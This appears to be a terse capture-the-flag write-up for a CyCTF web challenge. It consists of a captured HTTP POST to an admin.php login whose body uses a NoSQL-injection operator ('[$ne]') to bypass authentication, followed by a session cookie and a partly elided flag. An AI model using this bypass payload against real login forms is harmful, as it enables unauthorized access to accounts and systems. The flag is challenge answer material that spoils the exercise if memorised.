
```
cyctf-349239b6a9cd-leaks-0-0.chals.io/admin.php
```

```http
POST /admin.php HTTP/1.1
Host: cyctf-349239b6a9cd-leaks-0-0.chals.io
Cookie: USERSESSID=3c5081df1720ce3afe20fd2f34f006fb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 39
Origin: https://cyctf-349239b6a9cd-leaks-0-0.chals.io
Referer: https://cyctf-349239b6a9cd-leaks-0-0.chals.io/admin.php
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive

username[$ne]=Admin&password[$ne]=Admin
```

### **`in cookie`**

```
CyCTF{H0VX_xhuly75sYYoBC-T56kUhppTXrN7-LEg9HaJ1hM2............}
```
